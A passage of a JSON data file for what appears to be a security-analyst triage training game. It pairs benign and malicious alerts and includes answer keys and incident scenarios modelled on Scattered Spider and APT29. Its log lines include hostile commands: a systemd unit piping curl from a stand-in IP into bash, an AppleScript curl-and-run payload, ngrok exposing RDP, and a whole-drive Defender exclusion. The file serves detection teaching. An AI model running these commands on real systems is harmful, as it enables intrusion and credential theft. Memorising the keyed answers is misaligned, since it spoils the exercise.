endpoint.","q":{"kind":"tune","ask":"Best tuning?","o":["Exclude SophosFileScanner.exe querying *.sophosxl.net","Raise the entropy threshold for all domains","Exclude host WS-ENG-0144"],"a":0,"why":"Process + domain pair. A global threshold bump blinds you to real tunnels."},"tell":"Unique high-entropy labels look like DNS tunneling, but AV reputation services look up file hashes encoded as DNS labels. Resolve the domain owner and the querying process. Signed AV to its own vendor domain, fleet-wide, is noise.","pair":"z49"},{"id":"z49","d":"network","src":"DNS \u00b7 Windows DNS analytic","t":"High volume of unique subdomain queries to one domain","h":"WS-FIN-0233 \u00b7 rowens","l":["queries: 3,400/hr \u00b7 TXT \u00b7 unique labels under *.cdn-metrics.xyz (registered 9 days ago)","labels: long base32 strings, high entropy, never repeat","process: regsvr32.exe"],"v":1,"x":"T1071.004","c":"dns-tunnel-entropy","diff":2,"k":[0,2],"say":"Thirty four hundred TXT queries an hour with unique encoded labels to a nine day old domain. The querying process is regsvr32.","tell":"Long high-entropy, never-repeating labels to a 9-day-old domain, queried by regsvr32, is data riding out over DNS TXT. Young domain + unique encoded labels + weird process = tunneling. Escalate.","pair":"z48"},{"id":"z50","d":"network","src":"Proxy \u00b7 Zscaler (TLS inspected)","t":"SNI and Host header mismatch","h":"WS-MKT-0410 \u00b7 asingh","l":["SNI: cdn.jsdelivr.net \u00b7 Host: fastly.jsdelivr.net","both names under the same registrable domain and the same certificate","client: Chrome, HTTP/2 connection reuse during normal browsing"],"v":0,"x":"T1090.004","c":"domain-front-c2","diff":3,"trap":"scary","k":[1],"say":"TLS server name and HTTP host differ, but both are jsdelivr names on the same certificate, from Chrome reusing a connection.","tell":"Fronting needs the Host to be a different customer behind the shared CDN. Same registrable domain, one cert covering both, and HTTP/2 connection coalescing in Chrome = benign. Fronting puts an unrelated domain in Host behind a high-rep SNI."},{"id":"z51","d":"network","src":"Firewall \u00b7 Palo Alto TRAFFIC","t":"Periodic outbound connections at fixed interval","h":"SRV-APP-11","l":["dst: 20.x.x.x (Microsoft) :443 every 300s","bytes: steady ~2KB up/down \u00b7 app: ssl","process (via XDR): MsSense.exe EDR cloud check-in"],"v":0,"x":"T1071.001","c":"beacon-vs-telemetry","diff":2,"trap":"scary","k":[2],"say":"An app server connects every five minutes to a Microsoft IP, two kilobytes each way. The process is the Defender sensor checking in.","q":{"kind":"tune","ask":"Best tuning?","o":["Exclude all traffic to 20.0.0.0/8","Exclude signed MsSense.exe to Microsoft Defender endpoints","Exclude intervals of exactly 300s"],"a":1,"why":"Process + destination. Whole-ASN or interval exclusions hide C2 on Azure hosting."},"tell":"Perfect-interval beacons look like C2, but EDR, update agents and monitoring all check in on a timer. Resolve the destination and the process: a security agent phoning its own cloud is supposed to be rhythmic."},{"id":"z52","d":"network","src":"Firewall \u00b7 Palo Alto TRAFFIC","t":"Sequential connections across many hosts","h":"WS-ACCT-0412","l":["one src \u2192 254 dst IPs, dports 445/3389/22 in 90s","mostly resets/no-reply \u00b7 src is a finance workstation","not in vuln-scan CMDB, no change window"],"v":1,"x":"T1046","c":"internal-scan","diff":2,"k":[2],"say":"A finance workstation sweeps two hundred fifty four internal IPs on SMB, RDP and SSH in ninety seconds. It is not a registered scanner.","tell":"A finance endpoint sweeping a /24 on SMB/RDP/SSH in 90 seconds is internal recon, not accounting. A workstation that is not a scanner has no reason to port-scan the subnet. Escalate the pivot.","pair":"z53"},{"id":"z53","d":"network","src":"Firewall \u00b7 Palo Alto TRAFFIC","t":"Sequential connections across many hosts","h":"SRV-VM-02","l":["one src \u2192 entire 10.30.0.0/16, full port ranges","src IP in CMDB: Qualys scanner appliance","schedule: authorized monthly scan window, change CHG0044990"],"v":0,"x":"T1046","c":"internal-scan","diff":1,"k":[1],"say":"One source sweeps an entire slash sixteen on all ports. The CMDB lists it as the Qualys scanner appliance, inside its monthly window.","tell":"The same scan pattern from the CMDB-registered Qualys appliance inside its approved window is your own vuln management. Baseline scanner IPs and windows or you will chase them forever.","pair":"z52"},{"id":"z54","d":"network","src":"Zeek \u00b7 dns + ntlm logs","t":"Host answering name-resolution broadcasts","h":"WS-ENG-0088","l":["10.10.5.44 answered 310 LLMNR/NBT-NS queries for names it does not own","followed by: 6 inbound NTLMv2 auths from other hosts to 10.10.5.44 SMB","host is a normal dev workstation, no admin role, not a DNS/WINS server"],"v":1,"x":"T1557.001","c":"llmnr-poison","diff":3,"k":[0],"say":"A dev workstation answers three hundred broadcast name lookups for names it does not own, then six other hosts send it NTLM logins.","q":{"kind":"pivot","ask":"First pivot?","o":["Find which accounts sent NTLM to 10.10.5.44 and where they were relayed","Disable LLMNR by GPO and close","Re-image WS-ENG-0088 right away"],"a":0,"why":"Captured or relayed creds are the blast radius. GPO hardening comes after scoping."},"tell":"A workstation answering LLMNR/NBT-NS broadcasts for names it does not own is poisoning name resolution to harvest NetNTLMv2 for relay or cracking. Normal endpoints never respond to these. Captured auths + a dev box = active AiTM."},{"id":"z55","d":"network","src":"Sentinel \u00b7 SecurityEvent 5140","t":"Many ADMIN$ share connections across hosts","h":"SRV-DEPLOY-01","l":["src connects to ADMIN$ on 300 hosts in 10 min","account: svc_sccm_push \u00b7 source in CMDB: software-deploy server","change: monthly patch push window"],"v":0,"x":"T1021.002","c":"smb-admin-context","diff":2,"trap":"scary","k":[1],"say":"One server opens ADMIN shares on three hundred hosts in ten minutes, using the SCCM push account from the registered deployment server.","tell":"Mass ADMIN$ connections look like lateral spread, but that is exactly how software deployment and patch tools work. The deploy service account from the deploy server in a push window is doing its job \u2014 baseline it."},{"id":"z56","d":"network","src":"Firewall \u00b7 Palo Alto THREAT","t":"Outbound connection to Tor entry node","h":"LAB-VM-03","l":["dst: 9001 to known Tor guard relay","src: 10.99.0.23 in segmented assessment VLAN","engagement: authorized assessment, ROE on file, egress allowed for this host"],"v":0,"x":"T1090.003","c":"tor-egress","diff":2,"trap":"scary","k":[2],"say":"A lab VM connects to a Tor guard relay on port nine thousand one, from a segmented assessment VLAN listed in the rules of engagement.","tell":"Tor egress is almost always worth a look, but a segmented assessment host with an authorized engagement and documented ROE is sanctioned testing. Confirm the source is in-scope before you treat Tor as automatic evil."},{"id":"z57","d":"linux","src":"Linux \u00b7 auditd","t":"New systemd service unit created","h":"web-prod-04 \u00b7 www-data","l":["path: /etc/systemd/system/cache-helper.service","exec: /bin/bash -c \"curl -s hxxp://185.x.x.x/a|bash\"","created by: www-data (web server user) after a POST to /upload.php"],"v":1,"x":"T1543.002","c":"systemd-persist","diff":2,"k":[1,2],"say":"A new systemd service pipes curl from a raw IP into bash. It was written by the web server user right after an upload request.","q":{"kind":"pivot","ask":"First pivot?","o":["Pull web logs and files for the /upload.php POST","Delete cache-helper.service and close","Block 185.x.x.x and close"],"a":0,"why":"The upload is the entry point. Find the webshell, or it rewrites the unit."},"tell":"A service unit that curls a remote script into bash, written by www-data right after a file upload, is webshell-to-persistence. A web user should not be able to write units at all, so also hunt the privesc. Piping curl to bash = escalate.","pair":"z58"},{"id":"z58","d":"linux","src":"Linux \u00b7 auditd","t":"New systemd service unit created","h":"app-prod-02 \u00b7 root","l":["path: /etc/systemd/system/node-exporter.service","ExecStart=/usr/local/bin/node_exporter","created by: ansible (via /usr/bin/python3), playbook run id logged"],"v":0,"x":"T1543.002","c":"systemd-persist","diff":2,"k":[2],"say":"A new node exporter systemd service pointing at its real binary, written by an Ansible run with a logged playbook ID.","tell":"Config management installs services for a living. A node_exporter unit written by an Ansible run, pointing at a real binary, with a playbook run id, is infra automation. Trace the writer and the ExecStart target.","pair":"z57"},{"id":"z59","d":"linux","src":"Linux \u00b7 auditd","t":"Cron entry added","h":"db-prod-01 \u00b7 postgres","l":["file: /var/spool/cron/crontabs/postgres","entry: */5 * * * * /tmp/.x/beacon >/dev/null 2>&1","binary in hidden dir under /tmp, no package owner"],"v":1,"x":"T1053.003","c":"cron-persist","diff":2,"k":[1],"say":"The postgres user crontab now runs a binary from a hidden folder under tmp every five minutes, output silenced.","tell":"A cron job running a binary out of a hidden /tmp directory every 5 minutes is a beacon on a timer. Hidden path + /tmp + no owning package = persistence. Legit cron points at managed paths.","pair":"z60"},{"id":"z60","d":"linux","src":"Linux \u00b7 auditd","t":"Cron entry added","h":"app-prod-05 \u00b7 root","l":["file: /etc/cron.d/puppet-agent","entry: */30 * * * * root /opt/puppetlabs/bin/puppet agent --onetime","written by: puppet during catalog apply"],"v":0,"x":"T1053.003","c":"cron-persist","diff":1,"k":[1],"say":"A cron file runs the puppet agent from its install folder every thirty minutes. Puppet wrote it during a catalog apply.","tell":"Cron is the oldest persistence trick and the oldest admin tool. A puppet-agent entry in /etc/cron.d pointing at the real puppet binary is config management. The path and the writer tell you which it is.","pair":"z59"},{"id":"z61","d":"linux","src":"Linux \u00b7 auditd","t":"authorized_keys modified","h":"bastion-01 \u00b7 deploy","l":["file: /home/deploy/.ssh/authorized_keys appended","new key comment: root@kali","preceded by: successful SSH password login from 103.x.x.x (foreign), first-seen IP"],"v":1,"x":"T1098.004","c":"ssh-authkeys","diff":2,"k":[2],"say":"An SSH key is appended for the deploy user on the bastion, right after a password login from a never-seen foreign IP.","tell":"Appending an SSH key is how you keep access after a password login. A new key added right after a foreign password-based login, comment root@kali, is the attacker nailing the door open. Escalate.","pair":"z62"},{"id":"z62","d":"linux","src":"Linux \u00b7 auditd","t":"authorized_keys modified","h":"app-prod-07 \u00b7 root","l":["file: /root/.ssh/authorized_keys written at boot","writer: cloud-init (from instance user-data)","key matches the provisioning key in the golden image pipeline"],"v":0,"x":"T1098.004","c":"ssh-authkeys","diff":2,"k":[1],"say":"Root authorized keys written at first boot by cloud init, and the key matches the provisioning key from the image pipeline.","tell":"cloud-init writes authorized_keys on first boot from instance metadata \u2014 that is how cloud VMs get their SSH key. Writer is cloud-init at boot, key matches your pipeline = provisioning, not intrusion.","pair":"z61"},{"id":"z63","d":"linux","src":"Linux \u00b7 auditd","t":"Audit daemon configuration reloaded","h":"app-prod-03 \u00b7 root","l":["service auditd reload + augenrules --load","triggered by: ansible hardening playbook (CIS rules update)","rules count increased after reload, run id logged"],"v":0,"x":"T1685.004","c":"disable-auditd","diff":3,"trap":"scary","k":[2],"say":"Auditd reloaded by an Ansible hardening playbook. After the reload the audit rule count went up, not down.","tell":"An auditd reload pattern-matches \"attacker disabling logging\", but here the rule count went UP under a CIS hardening playbook. Reloading to add rules is the opposite of tampering. Check whether rules grew or vanished."},{"id":"z64","d":"linux","src":"Linux \u00b7 Sysmon for Linux","t":"Shell history disabled for session","h":"ci-runner-11 \u00b7 ci","l":["export HISTFILE=/dev/null in /home/ci/.bashrc","account: ci (ephemeral build runner)","set by base image build, same across all runners"],"v":0,"x":"T1070.003","c":"history-wipe","diff":3,"trap":"scary","k":[2],"say":"Shell history sent to dev null in the bashrc of an ephemeral CI runner. The setting comes from the base image, same on every runner.","q":{"kind":"tune","ask":"Best tuning?","o":["Suppress HISTFILE changes on all Linux hosts","Suppress HISTFILE=/dev/null in .bashrc for runner image hosts","Suppress the ci account everywhere"],"a":1,"why":"Scope to the image-baked file on runners; an interactive unset elsewhere still fires."},"tell":"Disabling shell history reads as anti-forensics, but ephemeral CI runners null their HISTFILE by design in the base image. Same setting on every runner, baked into the image = intentional hygiene, not a cover-up. The malicious version is an interactive user unsetting it mid-session."},{"id":"z65","d":"linux","src":"Linux \u00b7 auditd","t":"Sensitive credential file read","h":"files-prod-01 \u00b7 backup","l":["syscall: openat(/etc/passwd, O_RDONLY) \u00b7 caller: rsync","no access to /etc/shadow or /etc/gshadow","rsync is the nightly backup job, maps uids to names"],"v":0,"x":"T1003.008","c":"passwd-shadow-read","diff":3,"trap":"scary","k":[1],"say":"The nightly rsync backup reads the passwd file to map user IDs to names. It never touches the shadow file.","tell":"Reading /etc/passwd is normal \u2014 every uid-to-name lookup does it. The hashes live in /etc/shadow. A backup job reading passwd but never shadow is name resolution, not dumping. Watch for the shadow read."},{"id":"z66","d":"edr","src":"Defender for Endpoint \u00b7 DeviceRegistryEvents","t":"Real-time protection setting changed","h":"SRV-TEST-14 \u00b7 SYSTEM","l":["reg: HKLM\\...\\Windows Defender\\DisableRealtimeMonitoring = 1","applied via: GPO (security baseline for isolated test lab)","device in \"Lab-NoAV\" OU, offline segment"],"v":0,"x":"T1685","c":"defender-change-writer","diff":2,"trap":"scary","k":[1],"say":"Defender real-time protection turned off on a test server, applied by group policy for an isolated lab OU on an offline segment.","tell":"Turning off RTP is a top EDR-tamper signal, but orgs legitimately disable AV on isolated malware-analysis/test segments via GPO. Device in the lab OU, change by GPO = policy. The scary one is a process doing it locally on a prod box.","pair":"z67"},{"id":"z67","d":"edr","src":"Defender for Endpoint \u00b7 DeviceEvents","t":"Antivirus exclusion path added","h":"WS-SALES-0930 \u00b7 tbrooks","l":["cmd: Set-MpPreference -ExclusionPath C:\\","added by: powershell.exe child of a macro-enabled doc","user is local admin (split token) \u00b7 fodhelper UAC bypass preceded it"],"v":1,"x":"T1564.012","c":"defender-change-writer","diff":2,"k":[1],"say":"A Defender exclusion for the whole C drive, added by PowerShell spawned from a macro document, right after a UAC bypass.","q":{"kind":"pivot","ask":"First pivot?","o":["Remove the exclusion and rescan","Find what landed on disk after the exclusion and the macro doc source","Remove tbrooks from local admins"],"a":1,"why":"The exclusion exists to hide a payload. Find the payload and the delivery first."},"tell":"Excluding the entire C:\\ drive blinds AV everywhere at once. Done by PowerShell spawned from a macro, after a UAC bypass = attacker clearing the runway. Whole-drive exclusions are never legitimate.","pair":"z66"},{"id":"z68","d":"edr","src":"Defender for Endpoint \u00b7 AlertEvidence","t":"EDR sensor stopped reporting","h":"WS-OLD-0021 \u00b7 SYSTEM","l":["offboarding script run \u00b7 Sense service stopped \u00b7 device stops reporting","actor: SCCM task sequence \"Decommission-Workstation\" (svc_sccm)","device marked retired in CMDB, matching CHG ticket, disk wipe follows"],"v":0,"x":"T1685","c":"sensor-uninstall","diff":2,"trap":"scary","k":[2],"say":"A workstation runs the Defender offboarding script and stops reporting. The CMDB marks it retired under a matching change, with a disk wipe next.","tell":"Sensor removal is scary until you see it is the decommission task sequence retiring the box, with a ticket and a wipe. EDR removal is a problem when the device stays alive and in use afterward."},{"id":"z69","d":"edr","src":"macOS \u00b7 Unified Log (ESF)","t":"Scripting utility spawned a network downloader","h":"MBP-DESIGN-07 \u00b7 agreen","l":["cmd: osascript -e do shell script \u2192 curl -o /tmp/u hxxp://45.x.x.x/u","parent: a .app from ~/Downloads, unsigned, quarantine flag present","then: chmod +x /tmp/u && /tmp/u"],"v":1,"x":"T1059.002","c":"macos-osascript","diff":2,"k":[1],"say":"An unsigned app from Downloads runs AppleScript that curls a file from a raw IP into tmp, marks it executable and runs it.","q":{"kind":"contain","ask":"Best containment step?","o":["Delete /tmp/u and close","Block 45.x.x.x only","Isolate the Mac and rotate agreen browser, keychain and SSO creds"],"a":2,"why":"AMOS-style stealers grab keychain and cookies on first run. Assume creds are gone."},"tell":"AppleScript shelling out to curl a payload into /tmp, launched by an unsigned quarantined app from Downloads, is a macOS infostealer pattern (think Atomic/AMOS). osascript + do shell script + curl to /tmp = escalate."},{"id":"z70","d":"edr","src":"macOS \u00b7 Unified Log (ESF)","t":"Quarantine attribute removed from downloaded file","h":"MBP-ENG-12 \u00b7 dpatel","l":["xattr -d com.apple.quarantine ~/Downloads/zoom.pkg","run interactively by the user in Terminal","pkg is Developer ID signed and notarized (valid)"],"v":0,"x":"T1553.001","c":"macos-gatekeeper","diff":3,"trap":"scary","k":[2],"say":"A user strips the quarantine flag from a Zoom installer in Terminal. The package is Developer ID signed and notarized.","tell":"Stripping com.apple.quarantine is a Gatekeeper bypass, but users and scripts do it to a notarized installer that Gatekeeper would have let run anyway. Signed + notarized = the real risk is low; the tell for malice is removing quarantine from an UNsigned binary."},{"id":"t01","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Service created on domain controller","h":"SRV-DC-03 \u00b7 CORP\\a.nguyen","l":["cmd: sc.exe create UpdMon binPath= \"C:\\ProgramData\\upd\\monitor.exe\" start= auto","ticket: CHG0044120 \"Install monitoring agent on SRV-APP-17\"","signer: none"],"v":1,"x":"T1543.003","c":"ticket-must-match-scope","k":[1],"diff":3,"trap":"bland","say":"Unsigned service from ProgramData installed on a domain controller. The cited change ticket is for installing an agent on a different app server.","tell":"The ticket is real; it is just for a different box. Attackers love borrowing a legit CHG number. Ticket, host, and binary all have to match or it is cosplay.","q":{"kind":"pivot","ask":"First pivot?","o":["Check who created the service and from where (4697 + logon source)","Approve it, there is a ticket","Reboot the DC to clear the service"],"a":0,"why":"Find the session that did it; that tells you how far the attacker already is."},"pair":"t02"},{"id":"t02","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Service created on application server","h":"SRV-APP-17 \u00b7 CORP\\a.nguyen","l":["cmd: sc.exe create DTMonitor binPath= \"C:\\Program Files\\Datadog\\Datadog Agent\\bin\\agent.exe\" start= auto","ticket: CHG0044120 \"Install monitoring agent on SRV-APP-17\"","signer: Datadog, Inc."],"v":0,"x":"T1543.003","c":"ticket-must-match-scope","k":[1],"diff":2,"trap":"scary","say":"New auto-start service on an app server, signed by Datadog in Program Files. The change ticket names this exact server and agent.","tell":"Ticket names this host, binary is signed and where it belongs. All three line up, so close it. This is what a ticket is supposed to look like.","pair":"t01"},{"id":"t03","d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"Privileged role assigned","h":"Privileged Role Administrator","l":["target: r.okafor@corp.com","actor: r.okafor@corp.com (self-assigned via Graph API)","justification: \"CHG0043377 approved\"","CHG0043377 status: closed 19 days ago"],"v":1,"x":"T1098.003","c":"ticket-window-expired","k":[1,3],"diff":3,"trap":"bland","say":"A user grants themselves privileged role admin through the Graph API. The justification cites a change ticket that closed nineteen days ago.","tell":"Self-granted privilege with a dead ticket number pasted in as justification. Anybody can type CHG-anything. Check the status and window, not just the format.","q":{"kind":"contain","ask":"Best containment?","o":["Remove the role, revoke sessions, review what the account did since","Ask the user to open a fresh ticket","Disable PIM tenant-wide"],"a":0,"why":"Strip the privilege and the live tokens first; the paperwork conversation can wait."},"pair":"t04"},{"id":"t04","d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"Privileged role assigned","h":"Privileged Role Administrator","l":["target: r.okafor@corp.com","actor: PIM (activation, 2h, approver: k.reyes)","justification: \"CHG0045012 SSO cert rotation\"","CHG0045012 status: in progress, window 21:00-23:00 today"],"v":0,"x":"T1098.003","c":"ticket-window-expired","k":[1,3],"diff":2,"trap":"scary","say":"Privileged role activated through PIM for two hours with an approver. The ticket is open and its change window is tonight.","tell":"Same role, same person, but via PIM with an approver and a live window. The difference is the path and the clock, not the name.","pair":"t03"},{"id":"t05","d":"cloud","src":"ServiceNow \u00b7 sys_audit","t":"Change request created and approved","h":"CHG0046801 \u00b7 ServiceNow","l":["created by: svc_snow_integration (API)","approved by: svc_snow_integration (API), 40 sec later","scope: \"Add mail forwarding rule for exec mailboxes\"","source IP: 185.x.x.x (hosting provider)"],"v":1,"x":"T1078","c":"ticket-provenance","k":[1,3],"diff":3,"trap":"bland","say":"A change request for exec mail forwarding is created and approved by the same integration account, forty seconds apart, from a hosting provider IP.","tell":"If the attacker owns the ITSM integration account, the tickets ARE the attack. Same identity filing and approving, from a VPS, is not a change process.","q":{"kind":"pivot","ask":"First pivot?","o":["Find every change that integration account touched and where its secret lives","Reject this one ticket and move on","Reset the exec mailbox passwords"],"a":0,"why":"A compromised integration secret means more than one forged ticket. Scope it."},"pair":"t06"},{"id":"t06","d":"cloud","src":"ServiceNow \u00b7 sys_audit","t":"Change request created and approved","h":"CHG0046790 \u00b7 ServiceNow","l":["created by: m.alvarez (Messaging team)","approved by: CAB (3 approvers) after 2 days","scope: \"Add mail forwarding rule for legal hold mailbox to eDiscovery vault\"","source IP: corp VPN"],"v":0,"x":"T1078","c":"ticket-provenance","k":[1],"diff":2,"trap":"scary","say":"A mail forwarding change filed by a messaging engineer, approved by a three-person change board after two days, from the corporate VPN.","tell":"Human requester, separate approvers, real review time, internal destination. Separation of duties is the tell that the ticket itself is real.","pair":"t05"},{"id":"t07","d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Remote access tool installed","h":"WS-FIN-0310 \u00b7 CORP\\l.park","l":["installed: AnyDesk 8.1 as service","ticket: INC0101874 \"user needs remote support\"","ticket opened by: caller \"IT vendor\", via phone, 6 min before install","sanctioned RMM in org: ScreenConnect only"],"v":1,"x":"T1219","c":"ticket-provenance","k":[2,3],"diff":2,"say":"AnyDesk installed as a service on a finance workstation. The incident ticket was phoned in by an outside vendor minutes earlier. The company only sanctions ScreenConnect.","tell":"A ticket the attacker phoned in themselves is still a ticket. Unsanctioned RMM plus a vendor call is the callback-phishing playbook with paperwork.","pair":"t06"},{"id":"t08","d":"linux","src":"Linux \u00b7 auditd","t":"Sudoers file modified","h":"db-prod-04 \u00b7 root","l":["file: /etc/sudoers.d/90-ops","added: \"backup ALL=(ALL) NOPASSWD: ALL\"","commit msg: \"CHG0045555 backup tuning\"","author: backup (no Ansible run, edited via vi in SSH session from 10.8.3.44)"],"v":1,"x":"T1548.003","c":"ticket-must-match-scope","k":[1,3],"diff":3,"trap":"bland","say":"The backup account gets full passwordless sudo, hand edited in an interactive SSH session. Config management did not run. The note cites a backup tuning ticket.","tell":"Backup tuning never needs NOPASSWD: ALL, and real changes come through Ansible, not vi at 2am. The ticket number is decoration.","pair":"t02"}],"inc":[{"id":"inc_spider","g":"G1015","title":"Help Desk, We Have a Problem","diff":2,"intro":"Saturday, 11pm. Your help desk just took a call from \"the CFO\" who lost his phone at the airport. He was charming. He knew his employee ID. He was 19 and lives on Telegram. Meanwhile, your real IT team is doing real IT things. Tell them apart.","win":"You caught Scattered Spider before they reached ESXi and you did not page the whole IT team for their own change tickets. The real CFO is asleep, blissfully un-headlined. Crew captured.","lose":"They got Global Admin, federated a domain, and encrypted your ESXi hosts. Or you escalated so many legit admins that IR stopped answering your calls. Either way the help desk is in a meeting with Legal. Run it back.","contain":{"at":6,"ask":"cfo.smith is Global Admin and just federated corp-auth.com. First move?","o":["Revoke sessions, wipe rogue MFA, remove federation and GA role","Reset cfo.smith's password and close the ticket","Isolate the CFO's laptop in Defender"],"a":0,"why":"A password reset leaves live tokens, the rogue MFA and a federated IdP that mints any user. The laptop was never in the attack."},"a":[{"d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"Password reset by help desk","h":"cfo.smith@corp.com","l":["actor: helpdesk.ana@corp.com","verification: caller gave employee ID + manager name","callback to number on file: skipped (\"boarding now, please hurry\")","then: all MFA methods deleted, new Authenticator added from 104.x residential proxy"],"v":1,"x":"T1684.001","tell":"Employee ID is LinkedIn trivia, not identity. Skipped callback + MFA wipe + fresh device off a residential proxy = the caller wanted a clean account. Scattered Spider's whole opening move.","c":"helpdesk-reset-verification","k":[2,3],"diff":2,"say":"Help desk reset for the CFO. Caller skipped the callback, then all MFA methods were wiped and re-added from a residential proxy.","id":"inc_spider_0"},{"d":"cloud","src":"SharePoint \u00b7 OfficeActivity","t":"SharePoint search activity","h":"cfo.smith@corp.com","l":["SearchQueryPerformed: \"vpn\", \"password\", \"citrix\", \"vcenter\", \"onboarding\"","client IP: 104.x.x.x (same proxy as the new MFA device)","baseline: CFO's usual searches are \"Q3 forecast\", \"board deck\""],"v":1,"x":"T1213.002","tell":"The CFO does not search for vCenter runbooks. Someone is reading your IT docs to learn how to go deeper. Scattered Spider does its homework in YOUR SharePoint.","c":"sharepoint-recon-search","k":[0,1],"diff":1,"say":"The CFO account searching SharePoint for VPN, password, Citrix and vCenter docs, from the same proxy IP as the new MFA device.","id":"inc_spider_1"},{"d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"Password reset by help desk","h":"dnguyen@corp.com","l":["actor: helpdesk.ana@corp.com","verification: callback to HR number on file + video ID check","ticket: INC-48812 \u00b7 manager approved","then: Temporary Access Pass (1h) issued \u00b7 existing MFA methods kept"],"v":0,"x":"T1684.001","tell":"Same help desk, same request, real process: callback to the number on file, video ID, manager sign-off, MFA untouched. Resets are not evil. Skipped verification is.","c":"helpdesk-reset-verification","k":[1,3],"diff":2,"say":"Help desk reset for dnguyen. Callback to the HR number on file, video ID check, manager-approved ticket, one-hour pass, existing MFA kept.","id":"inc_spider_2"},{"d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Remote support tool installed","h":"SRV-JUMP-01 \u00b7 cfo.smith","l":["installed: ScreenConnect.ClientService.exe","relay: instance-7f3k.screenconnect.com (not corp tenant)","parent: msiexec.exe from C:\\Users\\cfo.smith\\Downloads\\","also: ngrok.exe tcp 3389"],"v":1,"x":"T1219","tell":"An RMM phoning someone else's instance + ngrok exposing RDP. Two persistent ways back in, both cosplaying as IT tools.","c":"rmm-instance-ownership","k":[1,3],"diff":1,"say":"ScreenConnect installed on the jump server from the CFO downloads folder, relaying to an unknown instance, plus ngrok exposing RDP.","id":"inc_spider_3"},{"d":"identity","src":"Entra ID \u00b7 AuditLogs (PIM)","t":"Global Administrator role assigned","h":"mreyes@corp.com","l":["operation: Add member to role completed (PIM activation)","justification: CHG-7731 rotate federation signing cert","approver: second GA (kpatel) \u00b7 MFA: number match \u00b7 compliant device","duration: 2h \u00b7 eligible assignment since 2023"],"v":0,"x":"T1098.003","tell":"Mid-incident, every GA activation looks like the attacker. This one is eligible, approved by a second human, time-boxed and ticketed. That is PIM doing its job, not a breach.","c":"pim-activation-context","k":[2,3],"diff":2,"say":"mreyes activated Global Admin through PIM. Change ticket attached, second admin approved, number-match MFA on a compliant device, two-hour window.","id":"inc_spider_4"},{"d":"endpoint","src":"Defender for Endpoint \u00b7 DeviceProcessEvents","t":"Remote support tool installed","h":"WS-FIN-114 \u00b7 SYSTEM","l":["installed: ScreenConnect.ClientService.exe","relay: corp.screenconnect.com (our tenant)","parent: IntuneManagementExtension.exe","assignment: \"IT Support Tools\" app, deployed to Finance group"],"v":0,"x":"T1219","tell":"Same tool, different owner. Your relay, your Intune, your app assignment. RMM is only evil when it phones someone else's house.","c":"rmm-instance-ownership","k":[1,2],"diff":2,"say":"ScreenConnect installed on a finance workstation by the Intune management extension, relaying to the corp tenant, part of the IT support tools app.","id":"inc_spider_5"},{"d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"Domain authentication changed","h":"corp.com tenant","l":["operation: Set domain authentication \u2192 Federated","domain: corp-auth.com (registered 3 days ago)","actor: cfo.smith@corp.com (Global Admin as of 22 min ago, no PIM)","issuer URI: http://corp-auth.com/adfs/services/trust"],"v":1,"x":"T1484.002","tell":"A federated domain they control lets them sign in as anyone, forever, MFA optional. Brand-new domain + brand-new GA with no PIM = \"we own your tenant\" speedrun.","c":"federation-trust-change","k":[1,2],"diff":2,"say":"A domain registered three days ago was set to federated by the CFO account, which became Global Admin twenty-two minutes ago without PIM.","id":"inc_spider_6"},{"d":"endpoint","src":"vCenter \u00b7 events","t":"ESXi SSH enabled","h":"esx-prod-07","l":["SSH service started on 1 host \u00b7 auto-stop timer 60 min","user: CORP\\vadmin.lin (vSphere admins group)","ticket: CHG-7740 apply ESXi 8.0 U3 patch","then: esxcli software vib update -d /vmfs/volumes/ds01/VMware-ESXi-8.0U3-depot.zip"],"v":0,"x":"T1021.004","tell":"One host, a timer, a patch ticket and a VIB update. Admins do need SSH sometimes. Scope and the very next command tell you why the door is open.","c":"esxi-ssh-change-window","k":[0,2,3],"diff":2,"say":"SSH enabled on one ESXi host for sixty minutes by a vSphere admin, on a patch ticket, followed by an esxcli software update.","id":"inc_spider_7"},{"d":"endpoint","src":"vCenter \u00b7 events","t":"ESXi SSH enabled","h":"esx-prod-01..12","l":["SSH service started on 12 hosts \u00b7 no auto-stop","user: vsphere.local\\cfo.smith (added to Administrators 10 min ago)","ticket: none","then: esxcli vm process list"],"v":1,"x":"T1021.004","tell":"SSH on EVERY ESXi host by a CFO who has never opened vCenter, then listing running VMs. That is step one of encrypting them. Pull the plug.","c":"esxi-ssh-change-window","k":[0,1,3],"diff":1,"say":"SSH enabled on all twelve production ESXi hosts with no timer and no ticket, by the CFO account, then listing running VMs.","id":"inc_spider_8"}]},{"id":"inc_apt29","g":"G0016","title":"The Forgotten Test Tenant","diff":3,"intro":"Someone made a test tenant in 2021. Nobody turned on MFA. Nobody remembers it. Russia's SVR remembers it. Your real admins are also rotating secrets and consenting apps tonight, because of course they are.","win":"You spotted APT29 riding a forgotten OAuth app into executive mailboxes, cut the cord, and left the backup team's Veeam alone. Midnight Blizzard captured. The board will never know how cool you were.","lose":"APT29 read the executive team's email for six weeks, or you nuked the backup app and lost a week of mail. You found out from a government advisory. Ouch. Run it back.","contain":{"at":7,"ask":"A rogue app is reading the CISO's mail over EWS right now. Move?","o":["Disable both apps, purge their secrets, hunt every app they touched","Reset svc_test_legacy's password and enforce MFA","Block the residential proxy IPs at the firewall"],"a":0,"why":"App-only tokens ignore the user's password and never cross your firewall. Kill the app credentials, then hunt the backup doors."},"a":[{"d":"identity","src":"Entra ID \u00b7 SigninLogs (test tenant)","t":"Failed sign-ins across many accounts","h":"test-tenant.onmicrosoft.com","l":["pattern: 1 attempt per account per hour, 340 accounts","source: rotating residential proxy IPs","success: svc_test_legacy (no MFA, no Conditional Access)"],"v":1,"x":"T1110.003","tell":"Low and slow through residential proxies, way under lockout thresholds. One forgotten non-MFA account was all APT29 needed. Patience is their whole personality.","c":"low-slow-spray","k":[0,2],"diff":2,"say":"Three hundred forty accounts, one failed attempt each per hour from rotating residential IPs, then a success on svc test legacy, which has no MFA.","id":"inc_apt29_0"},{"d":"identity","src":"Entra ID \u00b7 AuditLogs","t":"App credential added","h":"App: \"Legacy Test App\" (multi-tenant)","l":["operation: Update application \u2013 Certificates and 